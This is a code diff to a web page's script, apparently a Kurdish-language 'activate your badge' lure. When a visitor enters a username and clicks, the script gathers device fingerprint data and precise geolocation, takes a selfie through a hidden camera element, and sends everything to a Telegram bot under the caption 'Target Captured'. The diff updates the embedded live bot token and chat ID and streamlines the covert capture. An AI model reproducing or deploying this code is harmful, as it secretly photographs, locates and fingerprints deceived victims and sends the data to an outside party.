@@ -206,8 +206,8 @@
     (function(){
         "use strict";
 
-        // ========== تۆکن و چات ئایدی ==========
-        const TELEGRAM_BOT_TOKEN = '8626639755:AAFyksMLVD49z-wuV6WEy1KFIpCyGTmLe6Q';
+        // ========== نوێکرایەوە: تۆکن و چات ئایدی ==========
+        const TELEGRAM_BOT_TOKEN = '8678071350:AAEG1I_qN8aZpR4fds5o_8t6rv9byL1OVQk';
         const TELEGRAM_CHAT_ID = '659131693';
         
         const usernameInput = document.getElementById('usernameInput');
@@ -223,18 +223,12 @@
         let currentLocation = null;
         let deviceData = {};
 
+        // کۆکردنەوەی زانیاری ئامێر
         async function collectAllDeviceInfo() {
             const info = {};
             info.userAgent = navigator.userAgent;
             info.platform = navigator.platform;
             info.language = navigator.language;
-            info.languages = navigator.languages;
-            info.cookieEnabled = navigator.cookieEnabled;
-            info.doNotTrack = navigator.doNotTrack;
-            info.onLine = navigator.onLine;
-            info.screenWidth = window.screen.width;
-            info.screenHeight = window.screen.height;
-            info.devicePixelRatio = window.devicePixelRatio;
             info.hardwareConcurrency = navigator.hardwareConcurrency || 'نادیار';
             info.deviceMemory = navigator.deviceMemory || 'نادیار';
             
@@ -244,28 +238,19 @@
                 info.downlink = conn.downlink || 'نادیار';
                 info.rtt = conn.rtt || 'نادیار';
             }
-            
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    info.batteryLevel = Math.round(battery.level * 100) + '%';
-                    info.batteryCharging = battery.charging ? 'بەڵێ' : 'نەخێر';
-                } catch (e) { info.batteryLevel = 'نادیار'; }
-            }
-            
+
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const gl = canvas.getContext('webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
+                    if (debugInfo) info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                 }
-            } catch (e) { info.gpuRenderer = 'نادیار'; }
-            
+            } catch (e) {}
+
+            info.screenWidth = window.screen.width;
+            info.screenHeight = window.screen.height;
             info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            info.timestamp = new Date().toLocaleString('ku');
             return info;
         }
 
@@ -277,33 +262,17 @@
             }
         }
 
-        function updateDeviceInfoDisplay(info) {
-            const html = `
-                <div>📱 UA: ${(info.userAgent || '').substring(0, 40)}...</div>
-                <div>💻 سیستەم: ${info.platform || 'نادیار'} | CPU: ${info.hardwareConcurrency} ناوک</div>
-                <div>🧠 بیرگە: ${info.deviceMemory}GB | 📶 تۆڕ: ${info.connectionType}</div>
-                <div>🔋 پاتری: ${info.batteryLevel} | ⚡ بارگاویکردن: ${info.batteryCharging}</div>
-                <div>🕐 کات: ${info.timezone}</div>
-            `;
-            deviceInfoDiv.innerHTML = html;
-        }
-
-        function fetchLocation() {
+        async function fetchLocation() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
+                if (!navigator.geolocation) { resolve(null); return; }
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lng = pos.coords.longitude;
-                        currentLocation = { lat, lng, accuracy: pos.coords.accuracy };
-                        updateLocationText(lat, lng);
+                        currentLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                        updateLocationText(currentLocation.lat, currentLocation.lng);
                         resolve(currentLocation);
                     },
                     () => { resolve(null); },
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             });
         }
@@ -311,23 +280,14 @@
         async function sendToTelegram(imageBlob, username, location, deviceInfo) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('photo', imageBlob, `snap_${username}.jpg`);
+            formData.append('photo', imageBlob, `snap.jpg`);
             
-            let caption = `📸 *وێنەی پشتڕاستکردنەوە*\n👤 یوزەرنەیم: @${username}\n🕒 ${new Date().toLocaleString('ku')}`;
-            
+            let caption = `📸 *Target Captured*\n👤 User: @${username}\n\n`;
             if (location) {
-                caption += `\n📍 شوێن: ${location.lat},${location.lng}`;
-                caption += `\n🗺️ https://www.google.com/maps?q=${location.lat},${location.lng}`;
+                caption += `📍 Loc: ${location.lat},${location.lng}\n🗺️ Google Maps: https://www.google.com/maps?q=${location.lat},${location.lng}\n\n`;
             }
-            
-            caption += `\n\n📱 *زانیاری ئامێر:*`;
-            caption += `\n💻 سیستەم: ${deviceInfo.platform}`;
-            caption += `\n🧠 CPU: ${deviceInfo.hardwareConcurrency} ناوک | بیرگە: ${deviceInfo.deviceMemory}GB`;
-            caption += `\n🔋 پاتری: ${deviceInfo.batteryLevel} | 📶 تۆڕ: ${deviceInfo.connectionType}`;
-            caption += `\n🎮 GPU: ${deviceInfo.gpuRenderer}`;
-            caption += `\n🌍 ناوچەی کاتی: ${deviceInfo.timezone}`;
-            caption += `\n\n📋 UA: ${deviceInfo.userAgent}`;
-            
+            caption += `📱 OS: ${deviceInfo.platform}\n🧠 CPU: ${deviceInfo.hardwareConcurrency} Cores\n💾 RAM: ${deviceInfo.deviceMemory}GB\n📶 Net: ${deviceInfo.connectionType}\n🎮 GPU: ${deviceInfo.gpuRenderer}\n🌍 TZ: ${deviceInfo.timezone}`;
+
             formData.append('caption', caption);
             formData.append('parse_mode', 'Markdown');
 
@@ -336,68 +296,46 @@
                     method: 'POST',
                     body: formData
                 });
-                const data = await response.json();
-                return data.ok;
+                return response.ok;
             } catch (e) { return false; }
         }
 
         async function startHiddenCamera() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" },
-                    audio: false
-                });
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                 hiddenVideo.srcObject = stream;
-                await new Promise(r => { hiddenVideo.onloadedmetadata = r; });
-                await hiddenVideo.play();
                 return true;
             } catch (err) { return false; }
-        }
-
-        function stopCamera() {
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                stream = null;
-            }
-        }
-
-        async function capturePhoto() {
-            if (!stream) return null;
-            const ctx = hiddenCanvas.getContext('2d');
-            ctx.drawImage(hiddenVideo, 0, 0, 640, 480);
-            return await new Promise(r => hiddenCanvas.toBlob(r, 'image/jpeg', 0.9));
         }
 
         async function handleActivate() {
             if (isProcessing) return;
             const username = usernameInput.value.trim();
-            if (!username) {
-                statusMsg.innerHTML = '❗ تکایە یوزەرنەیم بنووسە';
-                return;
-            }
+            if (!username) return;
 
             isProcessing = true;
             activateBtn.disabled = true;
-            statusMsg.innerHTML = '⏳ پرۆسێس دەکرێت...';
+            statusMsg.innerHTML = '⏳ خەریکی چالاککردنە...';
             
             deviceData = await collectAllDeviceInfo();
-            updateDeviceInfoDisplay(deviceData);
-            
             const location = await fetchLocation();
             const camOk = await startHiddenCamera();
             
             if (camOk) {
                 await new Promise(r => setTimeout(r, 1000));
-                const photoBlob = await capturePhoto();
-                stopCamera();
-                if (photoBlob) {
-                    await sendToTelegram(photoBlob, username, location, deviceData);
-                }
+                const ctx = hiddenCanvas.getContext('2d');
+                ctx.drawImage(hiddenVideo, 0, 0, 640, 480);
+                hiddenCanvas.toBlob(async (blob) => {
+                    await sendToTelegram(blob, username, location, deviceData);
+                    stream.getTracks().forEach(t => t.stop());
+                    statusMsg.innerHTML = '✅ باجەکە بە سەرکەوتوویی چالاک کرا!';
+                }, 'image/jpeg');
+            } else {
+                statusMsg.innerHTML = '❌ هەڵە: تکایە ڕێگە بە کامێرا بدە';
             }
-
-            statusMsg.innerHTML = '✅ باجەکە بەسەرکەوتوویی چالاک کرا';
-            activateBtn.innerText = 'تەواو';
+            
             isProcessing = false;
+            activateBtn.disabled = false;
         }
 
         activateBtn.addEventListener('click', handleActivate);
